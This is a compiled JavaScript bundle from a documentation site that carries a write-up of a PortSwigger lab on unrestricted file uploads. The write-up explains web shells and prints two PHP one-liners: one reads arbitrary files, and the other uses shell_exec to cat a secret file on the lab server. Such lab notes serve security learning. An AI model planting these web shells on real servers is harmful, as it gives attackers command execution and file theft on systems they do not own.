"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[339],{3905:function(e,t,r){r.d(t,{Zo:function(){return p},kt:function(){return f}});var n=r(67294);function l(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function o(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),r.push.apply(r,n)}return r}function a(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?o(Object(r),!0).forEach((function(t){l(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):o(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function i(e,t){if(null==e)return{};var r,n,l=function(e,t){if(null==e)return{};var r,n,l={},o=Object.keys(e);for(n=0;n<o.length;n++)r=o[n],t.indexOf(r)>=0||(l[r]=e[r]);return l}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(n=0;n<o.length;n++)r=o[n],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(l[r]=e[r])}return l}var s=n.createContext({}),c=function(e){var t=n.useContext(s),r=t;return e&&(r="function"==typeof e?e(t):a(a({},t),e)),r},p=function(e){var t=c(e.components);return n.createElement(s.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},d=n.forwardRef((function(e,t){var r=e.components,l=e.mdxType,o=e.originalType,s=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),d=c(r),f=l,g=d["".concat(s,".").concat(f)]||d[f]||u[f]||o;return r?n.createElement(g,a(a({ref:t},p),{},{components:r})):n.createElement(g,a({ref:t},p))}));function f(e,t){var r=arguments,l=t&&t.mdxType;if("string"==typeof e||l){var o=r.length,a=new Array(o);a[0]=d;var i={};for(var s in t)hasOwnProperty.call(t,s)&&(i[s]=t[s]);i.originalType=e,i.mdxType="string"==typeof e?e:l,a[1]=i;for(var c=2;c<o;c++)a[c]=r[c];return n.createElement.apply(null,a)}return n.createElement.apply(null,r)}d.displayName="MDXCreateElement"},15457:function(e,t,r){r.r(t),r.d(t,{frontMatter:function(){return i},contentTitle:function(){return s},metadata:function(){return c},toc:function(){return p},default:function(){return d}});var n=r(87462),l=r(63366),o=(r(67294),r(3905)),a=["components"],i={tags:["webshell"],image:"img/Portswigger/file-upload.jpg"},s=void 0,c={unversionedId:"portswigger/File-upload/Lab-1 Unrestricted-file-uploads",id:"portswigger/File-upload/Lab-1 Unrestricted-file-uploads",title:"Lab-1 Unrestricted-file-uploads",description:"Exploiting unrestricted file uploads to deploy a web shell",source:"@site/docs/portswigger/File-upload/Lab-1 Unrestricted-file-uploads.md",sourceDirName:"portswigger/File-upload",slug:"/portswigger/File-upload/Lab-1 Unrestricted-file-uploads",permalink:"/Cybernotes/docs/portswigger/File-upload/Lab-1 Unrestricted-file-uploads",tags:[{label:"webshell",permalink:"/Cybernotes/docs/tags/webshell"}],version:"current",frontMatter:{tags:["webshell"],image:"img/Portswigger/file-upload.jpg"},sidebar:"tutorialSidebar",previous:{title:"Lab-6",permalink:"/Cybernotes/docs/portswigger/Directory-traversal/Lab-6"},next:{title:"Lab-2 Flawd-file-type-validation",permalink:"/Cybernotes/docs/portswigger/File-upload/Lab-2 Flawd-file-type-validation"}},p=[{value:"Exploiting unrestricted file uploads to deploy a web shell",id:"exploiting-unrestricted-file-uploads-to-deploy-a-web-shell",children:[],level:2},{value:"Challenge",id:"challenge",children:[],level:2}],u={toc:p};function d(e){var t=e.components,i=(0,l.Z)(e,a);return(0,o.kt)("wrapper",(0,n.Z)({},u,i,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h2",{id:"exploiting-unrestricted-file-uploads-to-deploy-a-web-shell"},"Exploiting unrestricted file uploads to deploy a web shell"),(0,o.kt)("p",null,"From a security perspective, the worst possible scenario is when a website allows you to upload server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code. This makes it trivial to create your own web shell on the server."),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.")),(0,o.kt)("p",null,"If you're able to successfully upload a web shell, you effectively have full control over the server. This means you can read and write arbitrary files, exfiltrate sensitive data, even use the server to pivot attacks against both internal infrastructure and other servers outside the network. For example, the following PHP one-liner could be used to read arbitrary files from the server's filesystem:"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"<?php echo file_get_contents('/path/to/target/file'); ?>")),(0,o.kt)("p",null,"Once uploaded, sending a request for this malicious file will return the target file's contents in the response."),(0,o.kt)("h2",{id:"challenge"},"Challenge"),(0,o.kt)("blockquote",null,(0,o.kt)("p",{parentName:"blockquote"},"In this challenge we just have to upload a webshell to read the flag from ",(0,o.kt)("inlineCode",{parentName:"p"},"/home/carlos/secret"))),(0,o.kt)("p",null,"--\x3e So i made this payload :"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-php"},"<?php echo shell_exec('cat /home/carlos/secret'); ?>\n")),(0,o.kt)("p",null,"--\x3e After successful upload right click on the image and select ",(0,o.kt)("inlineCode",{parentName:"p"},"copy image path")," and paste in url and you will find the flag!"),(0,o.kt)("p",null,(0,o.kt)("img",{src:r(10938).Z,width:"1373",height:"243"})))}d.isMDXComponent=!0},10938:function(e,t,r){t.Z=r.p+"assets/images/Pastedimage20220124122314-2639ab83779eea5e1f26eebfb5cf6088.png"}}]);